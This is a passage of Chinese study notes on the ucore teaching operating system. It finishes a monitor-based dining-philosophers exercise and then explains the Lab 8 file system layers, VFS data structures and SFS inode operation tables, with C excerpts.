title="练习2"></a>练习2</h3><blockquote><p>完成内核级条件变量和基于内核级条件变量的哲学家就餐问题</p></blockquote><p>管程里的全局变量:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_condvar[N];                            <span class="hljs-comment">// the philosopher&#x27;s state: EATING, HUNGARY, THINKING  </span><br><span class="hljs-keyword">monitor_t</span> mt, *mtp=&amp;mt;                          <span class="hljs-comment">// monitor</span><br></code></pre></div></td></tr></table></figure><p>而monitor是这样的(重复了一下上面的):</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>大致流程跟上面差不多, 在管程内部设置了cv数组来记录是否拿到了叉子, cond_signal和cond_wait的原理和实现在知识点中.</p><p><del>这里说明一下问题的流程:</del> </p><h1 id="Lab8"><a href="#Lab8" class="headerlink" title="Lab8"></a>Lab8</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目结构-1"><a href="#0-项目结构-1" class="headerlink" title="0.项目结构"></a>0.项目结构</h3><p>本次实验主要是理解kern/fs目录中的部分文件，并可用user/*.c测试所实现的Simple FS文件系统是否能够正常工作。本次实验涉及到的代码包括：</p><ul><li>文件系统测试用例： user/*.c：对文件系统的实现进行测试的测试用例；</li><li>通用文件系统接口<br>user/libs/file.[ch] | dir.[ch] | syscall.c：与文件系统操作相关的用户库实行；<br>kern/syscall.[ch]：文件中包含文件系统相关的内核态系统调用接口<br>kern/fs/sysfile.[ch]|file.[ch]：通用文件系统接口和实行</li><li>文件系统抽象层-VFS<br>kern/fs/vfs/*.[ch]：虚拟文件系统接口与实现</li><li>Simple FS文件系统<br>kern/fs/sfs/*.[ch]：SimpleFS文件系统实现</li><li>文件系统的硬盘IO接口<br>kern/fs/devs/dev.[ch] | dev_disk0.c：disk0硬盘设备提供给文件系统的I/O访问接口和实现</li><li>辅助工具<br>tools/mksfs.c：创建一个Simple FS文件系统格式的硬盘镜像。（<strong>理解此文件的实现细节对理解SFS文件系统很有帮助</strong>）</li><li>对内核其它模块的扩充<br>kern/process/proc.[ch]：增加成员变量 struct fs_struct *fs_struct，用于支持进程对文件的访问；重写了do_execve load_icode等函数以支持执行文件系统中的文件。<br>kern/init/init.c：增加调用初始化文件系统的函数fs_init。</li></ul><h3 id="1-ucore文件系统概述"><a href="#1-ucore文件系统概述" class="headerlink" title="1.ucore文件系统概述"></a>1.ucore文件系统概述</h3><p>ucore的文件系统模型源于Havard的OS161的文件系统和Linux文件系统。但其实这二者都是源于传统的UNIX文件系统设计。UNIX提出了四个文件系统抽象概念：文件(file)、目录项(dentry)、索引节点(inode)和安装点(mount point)。</p><ul><li><strong>文件</strong>：UNIX文件中的内容可理解为是一有序字节buffer，文件都有一个方便应用程序识别的文件名称（也称文件路径名）。典型的文件操作有读、写、创建和删除等。</li><li><strong>目录项</strong>：目录项不是目录（又称文件路径），而是目录的组成部分。在UNIX中目录被看作一种特定的文件，而目录项是文件路径中的一部分。如一个文件路径名是“/test/testfile”，则包含的目录项为：根目录“/”，目录“test”和文件“testfile”，这三个都是目录项。一般而言，目录项包含目录项的名字（文件名或目录名）和目录项的索引节点（见下面的描述）位置。</li><li><strong>索引节点</strong>：UNIX将文件的相关元数据信息（如访问控制权限、大小、拥有者、创建时间、数据内容等等信息）存储在一个单独的数据结构中，该结构被称为索引节点。</li><li><strong>安装点</strong>：在UNIX中，文件系统被安装在一个特定的文件路径位置，这个位置就是安装点。所有的已安装文件系统都作为根文件系统树中的叶子出现在系统中。</li></ul><p>上述抽象概念形成了UNIX文件系统的逻辑数据结构，并需要通过一个具体文件系统的架构设计与实现把上述信息映射并储存到磁盘介质上，从而在具体文件系统的磁盘布局（即数据在磁盘上的物理组织）上具体体现出上述抽象概念。比如文件元数据信息存储在磁盘块中的索引节点上。当文件被载入内存时，内核需要使用磁盘块中的索引点来构造内存中的索引节点。</p><p>ucore模仿了UNIX的文件系统设计，ucore的文件系统架构主要由四部分组成：</p><ul><li><strong>通用文件系统访问接口层</strong>：该层提供了一个从用户空间到文件系统的标准访问接口。这一层访问接口让应用程序能够通过一个简单的接口获得ucore内核的文件系统服务。</li><li><strong>文件系统抽象层</strong>：向上提供一个一致的接口给内核其他部分（文件系统相关的系统调用实现模块和其他内核功能模块）访问。向下提供一个同样的抽象函数指针列表和数据结构屏蔽不同文件系统的实现细节。</li><li><strong>Simple FS文件系统层</strong>：一个基于索引方式的简单文件系统实例。向上通过各种具体函数实现以对应文件系统抽象层提出的抽象函数。向下访问外设接口</li><li><strong>外设接口层</strong>：向上提供device访问接口屏蔽不同硬件细节。向下实现访问各种具体设备驱动的接口，比如disk设备接口/串口设备接口/键盘设备接口等。</li></ul><p>文件系统的访问处理过程: 假如应用程序操作文件（打开/创建/删除/读写），首先需要通过文件系统的通用文件系统访问接口层给用户空间提供的访问接口进入文件系统内部，接着由文件系统抽象层把访问请求转发给某一具体文件系统（比如SFS文件系统），具体文件系统（Simple FS文件系统层）把应用程序的访问请求转化为对磁盘上的block的处理请求，并通过外设接口层交给磁盘驱动例程来完成具体的磁盘操作。结合用户态写文件函数write的整个执行过程，我们可以比较清楚地看出ucore文件系统架构的层次和依赖关系。</p><p><img src="../../image/ucore/image001.png" alt="image"></p><h4 id="自上而下的数据结构"><a href="#自上而下的数据结构" class="headerlink" title="自上而下的数据结构"></a>自上而下的数据结构</h4><p>从ucore操作系统不同的角度来看，ucore中的文件系统架构包含四类主要的数据结构, 它们分别是：</p><ul><li>超级块（SuperBlock），它主要从文件系统的全局角度描述特定文件系统的全局信息。它的作用范围是整个OS空间。</li><li>索引节点（inode）：它主要从文件系统的单个文件的角度它描述了文件的各种属性和数据所在位置。它的作用范围是整个OS空间。</li><li>目录项（dentry）：它主要从文件系统的文件路径的角度描述了文件路径中的一个特定的目录项（注：一系列目录项形成目录/文件路径）。它的作用范围是整个OS空间。对于SFS而言，inode(具体为struct sfs_disk_inode)对应于物理磁盘上的具体对象，dentry（具体为struct sfs_disk_entry）是一个内存实体，其中的ino成员指向对应的inode number，另外一个成员是file name(文件名).</li><li>文件（file），它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息。它的作用范围是某一具体进程。</li></ul><p>如果一个用户进程打开了一个文件，那么在ucore中涉及的相关数据结构和关系如下图所示：</p><p><img src="../../image/ucore/image-20220105195357089.png" alt="image-20220105195357089"></p><p>understand生成的关系图:</p><p><img src="../../image/ucore/image-20220105200433737.png" alt="image-20220105200433737"></p><h3 id="2-系统访问接口层"><a href="#2-系统访问接口层" class="headerlink" title="2.系统访问接口层"></a>2.系统访问接口层</h3><p>从用户态函数syscall-&gt;sys_open(syscall.c)-&gt;sysfile_open(sysfile.c)中:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;     <span class="hljs-comment">// Open or create a file. FLAGS/MODE per the syscall.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Close a vnode opened  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;               <span class="hljs-comment">// Read file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;              <span class="hljs-comment">// Write file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;                <span class="hljs-comment">// Seek file  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;                   <span class="hljs-comment">// Stat file </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Sync file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// change DIR  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// create DIR</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;         <span class="hljs-comment">// set a path1&#x27;s link as path2</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_rename</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;       <span class="hljs-comment">// rename file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                           <span class="hljs-comment">// unlink a path</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getcwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span></span>;                      <span class="hljs-comment">// get current working directory</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *direntp)</span></span>;        <span class="hljs-comment">// get the file entry in DIR </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;                              <span class="hljs-comment">// duplicate file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd_store)</span></span>;                                <span class="hljs-comment">// build PIPE   </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;      <span class="hljs-comment">// build named PIPE</span><br></code></pre></div></td></tr></table></figure><p>然后调用file.c中具体的实现:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_open</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *dirent)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>sysfile_xxx算是在写操作系统的时候比较常用的函数.</p><h3 id="3-VFS层"><a href="#3-VFS层" class="headerlink" title="3.VFS层"></a>3.VFS层</h3><p>VFS有四个接口, 分别是file&amp;dir接口, inode接口, fs接口和外设接口. </p><h4 id="file-amp-dir接口"><a href="#file-amp-dir接口" class="headerlink" title="file&amp;dir接口"></a>file&amp;dir接口</h4><p>file&amp;dir接口层(共用一个结构体, 毕竟目录也是一种文件)定义了进程在内核中直接访问的文件相关信息，这定义在file数据结构中，具体描述如下：</p><blockquote><p>其中fd取决于进程的文件打开顺序, 最大值是<code>(4096 - sizeof(struct files_struct)) / sizeof(struct file)</code><br>而且在fd_array初始化的时候看起来file_struct和file挤满4KB空间, 不过不知道为什么</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,<br>    &#125; status;                         <span class="hljs-comment">//访问文件的执行状态</span><br>    <span class="hljs-keyword">bool</span> readable;                    <span class="hljs-comment">//文件是否可读</span><br>    <span class="hljs-keyword">bool</span> writable;                    <span class="hljs-comment">//文件是否可写</span><br>    <span class="hljs-keyword">int</span> fd;                           <span class="hljs-comment">//文件在filemap中的索引值</span><br>    <span class="hljs-keyword">off_t</span> pos;                        <span class="hljs-comment">//访问文件的当前位置</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span>               <span class="hljs-comment">//该文件对应的内存inode指针</span><br>    <span class="hljs-keyword">int</span> open_count;                   <span class="hljs-comment">//打开此文件的次数</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>而在kern/process/proc.h中的proc_struct结构中描述了进程访问文件的数据接口files_struct，其数据结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">pwd</span>;</span>                <span class="hljs-comment">//进程当前执行目录的内存inode指针</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">fd_array</span>;</span>            <span class="hljs-comment">//进程打开文件的数组</span><br>    <span class="hljs-keyword">atomic_t</span> files_count;             <span class="hljs-comment">//访问此文件的线程个数</span><br>    <span class="hljs-keyword">semaphore_t</span> files_sem;            <span class="hljs-comment">//确保对进程控制块中fs_struct的互斥访问</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>当创建一个进程后，该进程的files_struct将会被初始化或复制父进程的files_struct。当用户进程打开一个文件时，将从fd_array数组中取得一个空闲file项，然后会把此file的成员变量node指针指向一个代表此文件的inode的起始地址。</p><h4 id="inode接口"><a href="#inode接口" class="headerlink" title="inode接口"></a>inode接口</h4><p><u>index node</u>是位于内存的索引节点，它是VFS结构中的重要数据结构，因为它实际负责把不同文件系统的特定索引节点信息（甚至不能算是一个索引节点）统一封装起来，避免了进程直接访问具体文件系统。其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>                                 <span class="hljs-comment">//包含不同文件系统特定inode信息的union成员变量</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> __<span class="hljs-title">device_info</span>;</span>          <span class="hljs-comment">//设备文件系统内存inode信息</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> __<span class="hljs-title">sfs_inode_info</span>;</span>    <span class="hljs-comment">//SFS文件系统内存inode信息</span><br>    &#125; in_info;   <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        inode_type_device_info = <span class="hljs-number">0x1234</span>,<br>        inode_type_sfs_inode_info,<br>    &#125; in_type;                          <span class="hljs-comment">//此inode所属文件系统类型</span><br>    <span class="hljs-keyword">atomic_t</span> ref_count;                 <span class="hljs-comment">//此inode的引用计数</span><br>    <span class="hljs-keyword">atomic_t</span> open_count;                <span class="hljs-comment">//打开此inode对应文件的个数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">in_fs</span>;</span>                   <span class="hljs-comment">//抽象的文件系统，包含访问文件系统的函数指针</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> *<span class="hljs-title">in_ops</span>;</span>     <span class="hljs-comment">//抽象的inode操作，包含访问inode的函数指针     </span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>其中in_ops是一系列函数指针, 其实并不会全部用到, 只要定义需要的即可:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vop_magic;<br>    <span class="hljs-keyword">int</span> (*vop_open)(struct inode *node, <span class="hljs-keyword">uint32_t</span> open_flags);<br>    <span class="hljs-keyword">int</span> (*vop_close)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);<br>    <span class="hljs-keyword">int</span> (*vop_fsync)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_reclaim)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_gettype)(struct inode *node, <span class="hljs-keyword">uint32_t</span> *type_store);<br>    <span class="hljs-keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="hljs-keyword">off_t</span> pos);<br>    <span class="hljs-keyword">int</span> (*vop_truncate)(struct inode *node, <span class="hljs-keyword">off_t</span> len);<br>    <span class="hljs-keyword">int</span> (*vop_create)(struct inode *node, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">bool</span> excl, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_lookup)(struct inode *node, <span class="hljs-keyword">char</span> *path, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>实际用到的时候会使用宏定义简化, 利用语句块的值是最后一条语句的值来返回函数指针:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __vop_op(node, sym)                                                                         \</span><br><span class="hljs-meta">    (&#123;                                                                                              \</span><br><span class="hljs-meta">        struct inode *__node = (node);                                                              \</span><br><span class="hljs-meta">        assert(__node != NULL &amp;&amp; __node-&gt;in_ops != NULL &amp;&amp; __node-&gt;in_ops-&gt;vop_##sym != NULL);      \</span><br><span class="hljs-meta">        inode_check(__node, #sym);                                                                  \</span><br><span class="hljs-meta">        __node-&gt;in_ops-&gt;vop_##sym;  <span class="hljs-comment">/*把字符连接起来*/</span>                                               \</span><br><span class="hljs-meta">     &#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> vop_open(node, open_flags)                                  (__vop_op(node, open)(node, open_flags))</span><br></code></pre></div></td></tr></table></figure><p><code>inode_ops</code>成员是对常规文件、目录、设备文件所有操作的一个抽象函数表示。对于某一具体的文件系统中的文件或目录，只需实现相关的函数，就可以被用户进程访问具体的文件了，且用户进程无需了解具体文件系统的实现细节。</p><p><strong>注意到这些是对下一层SFS的接口, 在下一层中被实现.</strong> 可选实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Function table for device inodes.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// The sfs specific DIR operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_opendir,<br>    .vop_close                      = sfs_close,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_namefile                   = sfs_namefile,<br>    .vop_getdirentry                = sfs_getdirentry,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_lookup                     = sfs_lookup,<br>&#125;;<br><span class="hljs-comment">/// The sfs specific FILE operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_openfile,<br>    .vop_close                      = sfs_close,<br>    .vop_read                       = sfs_read,<br>    .vop_write                      = sfs_write,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_tryseek                    = sfs_tryseek,<br>    .vop_truncate                   = sfs_truncfile,<br>&#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">dev_node_ops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = dev_open,<br>    .vop_close                      = dev_close,<br>    .vop_read                       = dev_read,<br>    .vop_write                      = dev_write,<br>    .vop_fstat                      = dev_fstat,<br>    .vop_ioctl                      = dev_ioctl,<br>    .vop_gettype                    = dev_gettype,<br>    .vop_tryseek                    = dev_tryseek,<br>    .vop_lookup                     = dev_lookup,<br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="fs接口"><a href="#fs接口" class="headerlink" title="fs接口"></a>fs接口</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code 